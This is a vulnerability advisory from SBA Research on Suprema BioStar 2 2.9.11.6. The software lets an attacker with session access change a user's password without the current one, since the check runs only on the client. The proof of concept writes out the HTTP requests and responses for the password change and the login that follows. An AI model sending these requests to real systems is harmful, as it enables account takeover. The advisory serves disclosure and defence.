# Suprema BioStar 2 Insecure Password Change #

## Vulnerability Overview ##

Suprema’s BioStar 2 in version 2.9.11.6 allows users to set new password
without providing the current one. Exploiting this flaw combined
with other vulnerabilities can lead to unauthorized account
access and potential system compromise.

* **Identifier**            : SBA-ADV-20251104-02
* **Type of Vulnerability** : Improper Input Validation
* **Software/Product Name** : [BioStar 2](https://www.supremainc.com/en/platform/hybrid-security-platform-biostar-2.asp)
* **Vendor**                : [Suprema](https://www.supremainc.com/)
* **Affected Versions**     : 2.9.11.6
* **Fixed in Version**      : Not yet
* **CVE ID**                : CVE-2025-41257
* **CVSS Vector**           : CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N
* **CVSS Base Score**       : 4.8 (Medium)

## Vendor Description ##

> BioStar 2 is a web-based time, attendance, and access control management
> system

## Impact ##

If attackers get temporary access to a session (e.g., by having access to an
unlocked screen or by exploiting an additional XSS vulnerability) they can
change the password and therefore take over the account permanently.

## Vulnerability Description ##

The validation of the current password is happening only on the client-side.
No checks are performed on the server when a new password is set.

## Proof of Concept ##

We send the following request without the current password to the server:

```http
PUT /api/users/386 HTTP/1.1
Host: example.org
Cookie: JSESSIONID=ASDF[...]0A06
Content-Type: application/json;charset=UTF-8
Bs-Session-Id: b2[...]80
[...]

{
    "User":{"password":"1"}
}
```

The following response states that the request was accepted and the password
was changed successfully:

```http
HTTP/1.1 200
Status: 200 OK
X-Content-Type-Options: nosniff
X-XSS-Protection: 1
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Content-Length: 107

{
    "Response": {
        "code":"0";
        "link":"https:\/\/support.supremainc.com\/en\/support\/home",
        "message":"Success"
    }
}
```

After the change it is possible to get a session with this new password:

```http
POST /api/login HTTP/1.1
Host: example.com
Cookie: JSESSIONID=ASDF[...]0A06
Bs-Session-Key: fX[...]4=
Content-Type: application/json;charset=UTF-8
Content-Length: 47
Connection: keep-alive
[...]

{"User":{"login_id":"exampleuser","password":"1"}}
```

The response indicates that the login was successful:

```http
HTTP/1.1 200
Status: 200 OK
X-Content-Type-Options: nosniff
X-XSS-Protection: 1
X-Frame-Options: SAMEORIGIN
Content-Type: application/json;charset=UTF-8
Content-Length: 1774

{"User":{"user_id":"21",[...] }}
```

## Recommended Countermeasures ##

We are not aware of a released fix yet. However, the vendor has a patch
available for version 2.9.11. Please contact the vendor.

When a new password is set, the server needs to verify that
the user knows the current one.

## Timeline ##

* `2025-11-04` identified the vulnerability in version 2.9.11.6
* `2025-11-13` disclosed vulnerability to vendor
* `2025-12-19` vendor plans fix in version 2.9.12 without concrete release
               date
* `2026-01-05` vendor postponed fix to a later version
* `2026-01-15` vendor sends patch for version 2.9.11
* `2026-02-24` vendor plans fix in version 2.9.13 without concrete release
               date
* `2026-02-27` vendor releases version 2.9.12
* `2026-03-04` SBA Research assigned CVE-2025-41257
* `2026-03-04` public disclosure

## References ##

* OWASP Application Security Verification Standard (ASVS) v5.0.0.
  Requirement 6.2.3 Verify that password change functionality
  requires the user’s current and new password:
  <https://raw.githubusercontent.com/OWASP/ASVS/v5.0.0/5.0/OWASP_Application_Security_Verification_Standard_5.0.0_en.pdf>

## Credits ##

* Jakob Hagl ([SBA Research](https://www.sba-research.org/))
* Marija Radosavljević ([SBA Research](https://www.sba-research.org/))
* Fabian Funder ([SBA Research](https://www.sba-research.org/))

The discovery of this vulnerability was made possible through support
from [CYSSDE](https://cyssde.eu/) and the European Union.

![CYSSDE](images/cyssde.png)
